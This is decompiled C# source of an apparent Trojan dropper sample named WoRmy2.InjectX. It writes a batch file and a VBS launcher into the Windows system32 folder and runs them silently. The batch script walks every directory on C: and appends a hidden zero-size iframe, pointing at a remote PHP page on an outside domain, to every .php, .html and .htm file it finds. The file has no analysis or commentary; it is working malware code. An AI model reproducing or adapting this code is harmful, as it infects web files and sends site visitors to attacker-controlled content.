// Decompiled with JetBrains decompiler
// Type: WoRmy2.InjectX
// Assembly: WoRmy2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BEF434A9-1DC9-4A95-B187-DB247BE58F70
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Dorifel.bpw-6712c5b7b64846a6fd241818e9a5ad47266faee1f736c2c3f922e29ca4bcd8e3.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;

namespace WoRmy2
{
  [StandardModule]
  internal sealed class InjectX
  {
    public static void injectX_Sp()
    {
      try
      {
        if (File.Exists("C:\\WINDOWS\\system32\\launch.bat"))
        {
          File.Delete("C:\\windows\\system32\\launch.bat");
        }
        else
        {
          StreamWriter streamWriter1 = new StreamWriter((Stream) new FileStream("C:\\windows\\system32\\launch.bat", FileMode.Create, FileAccess.Write));
          streamWriter1.BaseStream.Seek(0L, SeekOrigin.End);
          streamWriter1.WriteLine("@echo off & break off");
          streamWriter1.WriteLine("dir /s /b /ad C:\\* >tmp");
          streamWriter1.WriteLine("for /f \"delims=\" %%t in (tmp) do (");
          streamWriter1.WriteLine("for %%o in (*.php) do (");
          streamWriter1.WriteLine("echo ^<iframe src=\"http://www.whathaveyouchosen.com.au/modules/mod_breadcrumbs/tmpl/Config/show.php\"height=0 width=0^> >>%%o");
          streamWriter1.WriteLine(")");
          streamWriter1.WriteLine("for %%m in (*.html) do (");
          streamWriter1.WriteLine("echo ^<iframe src=\"http://www.whathaveyouchosen.com.au/modules/mod_breadcrumbs/tmpl/Config/show.php\"height=0 width=0^> >>%%m");
          streamWriter1.WriteLine(")");
          streamWriter1.WriteLine("for %%y in (*.htm) do (");
          streamWriter1.WriteLine("echo ^<iframe src=\"http://www.whathaveyouchosen.com.au/modules/mod_breadcrumbs/tmpl/Config/show.php\"height=0 width=0^> >>%%y");
          streamWriter1.WriteLine(")");
          streamWriter1.Close();
          StreamWriter streamWriter2 = new StreamWriter((Stream) new FileStream("C:\\windows\\system32\\launch.vbs", FileMode.Create, FileAccess.Write));
          streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
          streamWriter2.WriteLine("Dim oShell");
          streamWriter2.WriteLine("Set oShell = WScript.CreateObject (\"WScript.Shell\")");
          streamWriter2.WriteLine("oShell.run \"C:\\windows\\system32\\launch.bat\",0,True");
          streamWriter2.WriteLine("Set oShell = Nothing ");
          streamWriter2.Close();
          Process.Start("C:\\windows\\system32\\launch.vbs");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }
}
